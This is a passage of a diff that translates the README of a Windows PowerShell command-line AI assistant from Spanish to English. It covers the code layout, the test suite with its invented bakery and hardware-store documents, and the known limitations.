+- **It searches for words, not ideas.** A question without any word from the
+  documents ("what color are the work clothes?" when the document says
+  "uniform") may not find them. The model can still ask for them with the
+  tool, or you can try `/documents search`.
+- **An answer is only as good as the passages.** If two documents
+  contradict each other, the model sees both. With "what time do you open on
+  Saturdays?", Gemma 4 E4B gave the warehouse's hours, which were on another
+  sheet of the Excel file.
 
-## Estructura del código
+## Code structure
 
 ```
-AI.bat              lanzadera CMD: separa pregunta de opciones y pasa la
-                    pregunta por la variable AI_QUESTION (esquiva el bug de
-                    comillas de "powershell -File")
-bin/ai.ps1          CLI principal: REPL, modo una-respuesta, subcomandos
-lib/core.ps1        nucleo HTTP (HttpWebRequest), streaming SSE, filtro de
-                    <think>, parser de errores de las distintas APIs
-lib/providers.ps1   tabla declarativa de proveedores y alias
-lib/ui.ps1          colores ANSI, render incremental de Markdown, PSReadLine
-lib/web.ps1         buscar en internet: hay salida?, DuckDuckGo, lectura de
-                    paginas y la herramienta buscar_web
-lib/equipo.ps1      lo que el equipo ya sabe: el reloj, las ocho lecturas
-                    (bateria, red, Windows, hardware), el atajo y la
-                    herramienta datos_equipo
-lib/comandos.ps1    comandos de solo lectura que guarda el usuario: las
-                    reglas (analizador de PowerShell y listas cerradas), la
-                    ejecucion por piezas y la herramienta comando_guardado
-lib/consultas.ps1   consultas web guardadas: leer una pagina, sacar los
-                    datos por sus rotulos y darlos en JSON
-lib/preferencias.ps1 lo que el usuario pide recordar: reconocer "recuerda
-                    que...", guardar y cargar, y la nota para el modelo
-lib/documentos.ps1  las carpetas de documentos: lectores de cada formato,
-                    fragmentos, indice y busqueda por palabras, y la
-                    herramienta consultar_documentos
-lib/pdf.ps1         el texto de un PDF, sin bibliotecas: objetos, streams,
-                    tipos de letra (ToUnicode, codificaciones) y la
-                    posicion de cada letra
-tools/Set-AIKey.ps1 guardado seguro de claves en HKCU\Environment
-tools/build.ps1     normaliza codificacion: UTF-8 con BOM en .ps1, CRLF en .bat
-tests/probar.ps1    pasa todas las pruebas y dice cuales fallan
-tests/*.ps1         una prueba por parte; sus frases y escenas, en tests/datos/
-tests/hacer-pdf.ps1 escribe los PDF de prueba (no es una prueba)
-HISTORIAL.md        que cambio en cada version, por que y como se probo
-docs/guia-documentos.md  guia de uso de los documentos, para el dueno de
-                    un negocio
-docs/video/         el video de presentacion: guion, narracion y su voz,
-                    capturas reales de la terminal y la composicion
-                    HyperFrames que lo renderiza
+AI.bat              CMD launcher: separates the question from the options and
+                    passes the question through the AI_QUESTION variable
+                    (avoids the quoting bug of "powershell -File")
+bin/ai.ps1          main CLI: REPL, one-answer mode, subcommands and the
+                    English names of the commands
+lib/idioma.ps1      the language of the messages (Spanish or English) and how
+                    it is chosen
+lib/core.ps1        HTTP core (HttpWebRequest), SSE streaming, <think>
+                    filter, error parser for the different APIs
+lib/providers.ps1   declarative table of providers and aliases
+lib/ui.ps1          ANSI colors, incremental Markdown rendering, PSReadLine
+lib/web.ps1         internet search: is there a connection?, DuckDuckGo,
+                    reading pages and the buscar_web tool
+lib/equipo.ps1      what the computer already knows: the clock, the eight
+                    readings (battery, network, Windows, hardware), the
+                    shortcut and the datos_equipo tool
+lib/comandos.ps1    read-only commands saved by the user: the rules
+                    (PowerShell parser and closed lists), piece-by-piece
+                    execution and the comando_guardado tool
+lib/consultas.ps1   saved web queries: reading a page, taking the data by
+                    its labels and giving it as JSON
+lib/preferencias.ps1 what the user asks to remember: recognizing "remember
+                    that...", saving and loading, and the note for the model
+lib/documentos.ps1  the document folders: readers for each format,
+                    passages, index and word search, and the
+                    consultar_documentos tool
+lib/pdf.ps1         the text of a PDF, without libraries: objects, streams,
+                    fonts (ToUnicode, encodings) and the position of each
+                    letter
+tools/Set-AIKey.ps1 secure key storage in HKCU\Environment
+tools/build.ps1     normalizes encoding: UTF-8 with BOM in .ps1, CRLF in .bat
+tests/probar.ps1    runs all the tests and says which ones fail
+tests/*.ps1         one test per part; their sentences and scenes, in tests/datos/
+tests/hacer-pdf.ps1 writes the test PDFs (it is not a test)
+tests/negocio-en.ps1 the test business in English (loaded by negocio.ps1
+                    with -Idioma en)
+HISTORIAL.md        what changed in each version, why and how it was tested
+                    (in Spanish)
+docs/documents-guide.md  usage guide for the documents, for a business
+                    owner (in Spanish: docs/guia-documentos.md)
+docs/video/         the presentation video: script, narration and its voice,
+                    real terminal captures and the HyperFrames composition
+                    that renders it
 ```
 
-Si editas cualquier `.ps1` o `.bat`, pasa después `tools/build.ps1`: Windows
-PowerShell 5.1 decide la codificación de un script por su BOM, y un `.ps1`
-sin BOM con acentos se lee como cp1252 y acaba en mojibake (o directamente no
-parsea).
+If you edit any `.ps1` or `.bat`, run `tools/build.ps1` afterwards: Windows
+PowerShell 5.1 decides a script's encoding by its BOM, and a `.ps1` without
+a BOM with accented characters is read as cp1252 and ends up as mojibake (or
+does not parse at all).
 
-## Pruebas
+## Tests
 
-Después de un cambio, y antes de subirlo:
+After a change, and before pushing it:
 
 ```
 powershell -NoProfile -ExecutionPolicy Bypass -File tests\probar.ps1
 ```
 
-Sin modelo y sin internet tarda unos 30 segundos y pasa ocho pruebas:
+Without a model and without internet it takes about 30 seconds and runs
+eight tests:
 
-| Prueba | Qué mira |
+| Test | What it checks |
 | --- | --- |
-| `comandos.ps1` | Comandos guardados: 158 comandos de `datos/reglas.txt` que las reglas deben aceptar o rechazar, el plan que se ejecuta, direcciones, nombres, la ejecución, guardar y cargar, lo que ve el modelo y el atajo. |
-| `equipo-frases.ps1` | 58 frases de `datos/equipo-frases.txt` y dos casos más: qué datos del equipo pide cada una, o ninguno. |
-| `equipo.ps1` | Reloj, formatos con un equipo de mentira y la lectura de verdad de este equipo. Esta lectura sale en pantalla y no se guarda. |
-| `preferencias.ps1` | Qué mensajes piden recordar algo y qué se guarda, la limpieza, guardar y cargar, el fichero roto, la nota para el modelo y que el modelo no pueda guardarlas. |
-| `consultas.ps1` | Consultas web, con una página de ejemplo (`datos/consulta.html`): buscar rótulos, los bloques y el dato que falta, páginas JSON, el JSON que sale, lo que propone el modelo, guardar y cargar, y qué peticiones son de internet. |
-| `documentos.ps1` | Documentos de una ferretería inventada en todos los formatos, creados al vuelo en una carpeta temporal (en el repositorio no hay binarios). Mira cada lector (y PDFs de prueba de verdad: comprimidos, con objetos dentro de streams, tipos de letra recortados con ToUnicode, letras por su nombre, y los que no se leen: escaneado, protegido, sin tabla de letras y roto), los fragmentos, qué se relee y qué no, el índice guardado, 15 preguntas que tienen que encontrar su fragmento y 6 que no deben sacar documentos, las peticiones conversadas y el orden de las órdenes `/documentos`, y también olvidar. Con `-Crear <carpeta>` solo crea la ferretería, para probarla a mano. |
-| `negocio.ps1` | Un negocio inventado entero, la Panadería y Cafetería La Espiga: quiénes son, servicios y precios, empleados, horarios por sucursal, vacaciones y permisos, reglamento, procedimientos, quejas, pedidos, proveedores, seguridad alimentaria, inventario, y necesidades y metas. Va en trece formatos (el catálogo de pasteles es un PDF), con trampas: datos que no están, dos horarios, una factura escaneada en PDF y un temporal de Word. Sin modelo mira el procesamiento: qué se lee de cada fichero, que cada una de las 34 preguntas encuentre su documento y olvidar. Con `-Crear <carpeta>` solo crea los documentos. |
-| `dialogo.ps1 -SoloReconocer` | Reconocer cuándo una frase pide guardar un comando (`datos/peticiones.txt`) y leer lo que propone el modelo. |
+| `comandos.ps1` | Saved commands: 158 commands from `datos/reglas.txt` that the rules must accept or reject, the plan that runs, addresses, names, execution, saving and loading, what the model sees and the shortcut. |
+| `equipo-frases.ps1` | 58 sentences from `datos/equipo-frases.txt` and two more cases: which computer data each one asks for, or none. |
+| `equipo.ps1` | Clock, formats with a fake computer and the real reading of this computer. That reading is shown on screen and not saved. |
+| `preferencias.ps1` | Which messages ask to remember something and what gets saved, the cleanup, saving and loading, the corrupted file, the note for the model and that the model cannot save them. |
+| `consultas.ps1` | Web queries, with a sample page (`datos/consulta.html`): finding labels, the blocks and the missing data, JSON pages, the JSON that comes out, what the model proposes, saving and loading, and which requests go to the internet. |
+| `documentos.ps1` | Documents of an invented hardware store in every format, created on the fly in a temporary folder (there are no binaries in the repository). It checks each reader (and real test PDFs: compressed, with objects inside streams, subset fonts with ToUnicode, letters by their name, and the ones that are not read: scanned, protected, without a letter table and broken), the passages, what is reread and what is not, the saved index, 15 questions that have to find their passage and 6 that must not bring up documents, the conversational requests and the order of the `/documents` commands, and also forgetting. With `-Crear <folder>` it only creates the hardware store, to try it by hand. |
+| `negocio.ps1` | A whole invented business, the Panadería y Cafetería La Espiga (a bakery and café): who they are, services and prices, staff, hours per branch, vacations and leave, rules, procedures, complaints, orders, suppliers, food safety, inventory, and needs and goals. It comes in thirteen formats (the cake catalog is a PDF), with traps: data that is not there, two schedules, a scanned invoice in PDF and a Word temp file. Without the model it checks the processing: what is read from each file, that each of the 34 questions finds its document, and forgetting. With `-Crear <folder>` it only creates the documents. With `-Idioma en`, the same with a business in English (Linden Street Coffee House, a US coffee shop, in `negocio-en.ps1`) and the program in English; `probar.ps1` does not run it on its own. |
+| `dialogo.ps1 -SoloReconocer` | Recognizing when a sentence asks to save a command (`datos/peticiones.txt`) and reading what the model proposes. |
 
-Opciones:
+Options:
 
-- **`-Red`:** añade unas pocas peticiones de verdad a internet, para la IP pública, un servidor que no existe y la página de la Lotería Nacional de Nicaragua.
-- **`-Modelo`:** necesita el llama-server en marcha y tarda varios minutos. Pasa las once escenas de `datos/escenas.txt` por el diálogo real de `bin/ai.ps1`, con las respuestas del usuario ya escritas, y prueba `/comando agregar` con nueve casos. También hace al modelo las preguntas de `negocio.ps1` y mira cada respuesta:
-  - los datos que están tienen que salir, y del documento;
-  - los que no están («¿cuánto gana Lucía?», «¿aceptan tarjeta?») tienen que decir que no vienen, sin cifras ni correos inventados;
-  - lo que no va del negocio («¿cuál es la capital de Francia?») se contesta sin documentos;
-  - lo olvidado ya no se sabe.
+- **`-Red`:** adds a few real requests to the internet, for the public IP, a server that does not exist and the Nicaraguan National Lottery page.
+- **`-Modelo`:** needs llama-server running and takes several minutes. It runs the eleven scenes from `datos/escenas.txt` through the real dialog of `bin/ai.ps1`, with the user's answers already written, and tests `/command add` with nine cases. It also asks the model the questions from `negocio.ps1` and checks each answer:
+  - the data that is there has to come out, and from the document;
+  - what is not there ("how much does Lucía make?", "do you take cards?") has to say it is not there, without made-up figures or emails;
+  - what is not about the business ("what is the capital of France?") is answered without documents;
+  - what was forgotten is no longer known.
 
-Las respuestas del modelo cambian de una vez a otra: si una escena falla, lee su conversación antes de dar el fallo por bueno.
+The model's answers change from one run to the next: if a scene fails, read its conversation before accepting the failure.
 
-Cada prueba sale con su número de fallos, y `probar.ps1` sale con el número de pruebas que fallaron (0 es que todo va bien).
+Each test exits with its number of failures, and `probar.ps1` exits with the number of tests that failed (0 means everything is fine).
 
-## Limitaciones conocidas
+## Known limitations
 
-- Pensado para Windows; no se ha probado en PowerShell para Linux/macOS.
-- Sin soporte de imágenes ni ficheros adjuntos más allá del contexto por
-  stdin / `-Context` y las carpetas de `/documentos`. Las únicas herramientas
-  son `buscar_web`, `datos_equipo`, `comando_guardado` y
-  `consultar_documentos`.
-- El coste de la memoria del REPL crece con la conversación (se envía entera
-  en cada turno): usa `/new` en conversaciones largas.
+- Designed for Windows; it has not been tested on PowerShell for
+  Linux/macOS.
+- No support for images or attached files beyond the stdin / `-Context`
+  context and the `/documents` folders. The only tools are `buscar_web`,
+  `datos_equipo`, `comando_guardado` and `consultar_documentos`.
+- The cost of the REPL's memory grows with the conversation (it is sent in
+  full on every turn): use `/new` in long conversations.
 
-## Licencia
+## License
 
 [MIT](LICENSE).
